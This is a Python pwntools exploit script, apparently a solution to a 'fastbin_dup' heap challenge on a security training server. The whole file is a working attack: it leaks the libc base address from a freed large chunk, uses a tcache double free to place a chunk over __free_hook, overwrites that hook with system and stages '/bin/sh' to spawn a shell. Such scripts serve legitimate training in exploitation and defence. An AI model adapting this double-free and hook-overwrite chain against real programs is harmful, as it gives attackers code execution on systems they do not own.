from pwn import *

CHALL_PATH = './fastbin_dup'
CHALL = ELF(CHALL_PATH)
LIBC = ELF('./libc-2.27.so')
COMMANDS = """
c
"""

def alloc(c, size):
    c.recvuntil(b'> ')
    c.sendline(b'1')
    
    c.recvuntil(b'Size: ')
    c.sendline(str(size).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    line = c.recvline()
    index = int(line.split(b'index ')[1].split(b'!\n')[0])
    return index
    
def free(c, index):
    c.recvuntil(b'> ')
    c.sendline(b'4')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes

def write(c, index, data):
    c.recvuntil(b'> ')
    c.sendline(b'2')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    
    c.recvuntil(b'Content: ')
    c.send(data)

def read(c, index):
    c.recvuntil(b'> ')
    c.sendline(b'3')
    
    c.recvuntil(b'Index: ')
    c.sendline(str(index).encode())  #size is an integer, str(size) is a string, .encode() gives us the bytes
    
    line = c.recvline()
    return line

if args.REMOTE:
    c = remote('fastbin-dup.training.offensivedefensive.it', 8080, ssl = True)
    
elif args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)

else:
    c = process(CHALL_PATH)
    

# LEAKING LIBC
# Two alternatives: full the tcache so that the 8th chunk will go in the unsortedbins
# or simply allocate a chunk with size >= 0x500 so that it will go directly in the unsortedbins

# First alternative
#for i in range(8):
#    alloc(c, 0x100) # index from 0 to 7
#    
#alloc(c, 0x10)
#    
#for i in range(8):
#    free(c, i)

# Second alternative
alloc(c, 0x500) # Index 0
alloc(c, 0x10) # Index 1
free(c, 0)

leak = read(c, 0).split(b'\n')[0].ljust(8, b'\x00')
leak = u64(leak)
LIBC.address = leak - 0x3c4b78
print(f'LIBC BASE ADDRESS: {hex(LIBC.address)}')

# We perform the double free
alloc(c, 0x20) # Index 2
alloc(c, 0x20) # Index 3

free(c, 3)
free(c, 3) 

# We allocate a fake chunk to exploit the free hook
alloc(c, 0x20) # Index 4
write(c, 4, p64(LIBC.symbols['__free_hook']))
alloc(c, 0x20) # Index 5

# Allocate over the free_hook
alloc(c, 0x20) # Index 6
write(c, 6, p64(LIBC.symbols["system"]))

# Now we only need to free a chunk that contains /bin/sh
write(c, 5, b'/bin/sh\00')

# When executing the script, manually free the chunk at index 5 to spawn a shell

c.interactive()